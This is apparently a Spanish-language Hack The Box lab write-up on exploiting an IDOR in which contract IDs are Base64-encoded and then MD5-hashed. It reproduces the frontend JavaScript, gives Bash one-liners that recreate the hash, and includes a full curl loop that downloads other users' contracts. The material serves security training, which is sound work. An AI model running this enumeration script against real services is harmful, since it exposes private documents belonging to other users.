
## 1. Identificar referencias codificadas o hasheadas

Algunas aplicaciones web no utilizan identificadores directamente visibles, sino que los codifican o aplican un hash para dificultar su enumeración.

En el laboratorio Employee Manager, la descarga de contratos se realiza mediante una petición POST a:

```
POST /download.php HTTP/1.1
Host: SERVER_IP:PORT
Content-Type: application/x-www-form-urlencoded

contract=cdd96d3cc73d1dbdaffa03cc6cd7339b
```

El parámetro `contract` contiene un valor con apariencia de hash MD5.

El uso de un script como `download.php` permite gestionar las descargas sin enlazar directamente a los archivos, pero **no garantiza que exista un control de acceso adecuado**.

### Comprobar si el hash corresponde al UID

Podemos calcular el MD5 del identificador `1`:

```
echo -n 1 | md5sum
```

Resultado:

```
c4ca4238a0b923820dcc509a6f75849b
```

Como no coincide con el hash de `contract`, el identificador no se está hasheando directamente.

Podríamos probar otros valores o combinaciones, pero primero conviene investigar cómo genera la aplicación esa referencia.

## 2. Divulgación de funciones en JavaScript

Las aplicaciones web pueden ejecutar en el frontend funciones que calculan referencias utilizadas posteriormente por el backend.

Podemos inspeccionar el código fuente HTML y JavaScript para localizar funciones relacionadas con la descarga de archivos.

En el laboratorio encontramos:

```
function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString(),
    }, "POST", "_self");
}
```

El enlace que invoca la función utiliza:

```
javascript:downloadContract('1')
```

### Analizar la función

La función realiza las siguientes operaciones:

1. Recibe el UID como argumento.
    
2. Codifica el UID en Base64 mediante `btoa(uid)`.
    
3. Calcula el hash MD5 del resultado utilizando `CryptoJS.MD5()`.
    
4. Envía el hash al endpoint `/download.php` mediante una petición POST.
    
5. Utiliza el parámetro `contract` para identificar el contrato que se va a descargar.
    

La transformación es:

```
UID → Base64 → MD5 → Parámetro contract
```

**Concepto clave:** aunque una referencia parezca segura porque está hasheada, podemos reproducir su generación si conocemos el algoritmo y el valor de entrada.

## 3. Reproducir la transformación

Para replicar la función JavaScript desde Bash, podemos utilizar `base64` y `md5sum`.

```
echo -n 1 | base64 -w 0 | md5sum
```

Resultado:

```
cdd96d3cc73d1dbdaffa03cc6cd7339b -
```

El hash coincide con el valor enviado por la aplicación.

### ¿Por qué se utilizan estas opciones?

|Comando u opción|Función|
|---|---|
|`echo -n 1`|Imprime `1` sin añadir un salto de línea.|
|`base64 -w 0`|Codifica el valor en Base64 sin introducir saltos de línea en la salida.|
|`md5sum`|Calcula el hash MD5.|
|`tr -d ' -'`|Elimina los espacios y el guion de la salida de `md5sum`.|

Es importante evitar caracteres adicionales, como saltos de línea, porque cambiarían el hash resultante.

## 4. Enumeración masiva de contratos

Una vez identificada la transformación, podemos calcular la referencia correspondiente a cada UID y enviarla al endpoint de descarga.

### Paso 1. Generar los hashes de varios usuarios

```
for i in {1..10}; do
    echo -n "$i" | base64 -w 0 | md5sum | tr -d ' -'
done
```

El bucle genera un hash para cada identificador del `1` al `10`.

### Paso 2. Descargar los contratos automáticamente

Script completo:

```
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
    hash=$(echo -n "$i" | base64 -w 0 | md5sum | tr -d ' -')

    curl -sOJ -X POST \
        -d "contract=$hash" \
        "$url/download.php"
done
```

Sustituye `SERVER_IP:PORT` por la dirección del objetivo de HTB.

### Funcionamiento

1. Recorre los UID del `1` al `10`.
    
2. Codifica cada UID en Base64.
    
3. Calcula el MD5 del valor codificado.
    
4. Envía una petición POST con el hash en `contract`.
    
5. Descarga la respuesta utilizando el nombre de archivo indicado por el servidor, cuando este proporciona la cabecera correspondiente.
    

Opciones de `curl` utilizadas:

|Opción|Función|
|---|---|
|`-s`|Modo silencioso.|
|`-O`|Guarda la respuesta utilizando el nombre remoto cuando está disponible.|
|`-J`|Utiliza el nombre indicado por `Content-Disposition`, si existe.|
|`-X POST`|Envía una petición POST.|
|`-d`|Envía los datos del formulario.|

El resultado esperado en el laboratorio son los contratos correspondientes a los identificadores probados, siempre que el endpoint permita acceder a ellos.

## 5. Metodología para HTB

Cuando encuentres una posible referencia codificada o hasheada:

1. **Intercepta la petición:** utiliza Burp Suite para identificar el endpoint, el método HTTP y el parámetro que identifica el recurso.
    
2. **Inspecciona el frontend:** revisa el HTML y JavaScript en busca de funciones que generen referencias.
    
3. **Identifica la transformación:** determina si utiliza Base64, MD5 u otra operación.
    
4. **Reproduce el algoritmo:** utiliza Bash, Python u otra herramienta para obtener el mismo resultado.
    
5. **Prueba otros identificadores:** genera referencias para otros usuarios.
    
6. **Automatiza las peticiones:** utiliza `curl`, Burp Intruder o ZAP Fuzzer.
    
7. **Verifica el acceso:** comprueba que las respuestas contienen recursos pertenecientes a otros usuarios.
    

## Chuleta rápida

|Objetivo|Comando o técnica|
|---|---|
|Calcular MD5|`echo -n "valor" \| md5sum`|
|Codificar en Base64|`echo -n "valor" \| base64 -w 0`|
|Calcular Base64 + MD5|`echo -n "1" \| base64 -w 0 \| md5sum`|
|Limpiar la salida|`tr -d ' -'`|
|Generar hashes para varios UID|Bucle `for` con `base64` y `md5sum`|
|Descargar mediante POST|`curl -sOJ -X POST -d "contract=$hash" "$url/download.php"`|

### Concepto clave para el examen

**Codificar o hashear un identificador no sustituye a la autorización del backend.**

Si podemos descubrir cómo se genera una referencia y reproducirla para otros usuarios, podemos enumerar recursos y explotar un IDOR cuando el servidor no comprueba correctamente los permisos de acceso.
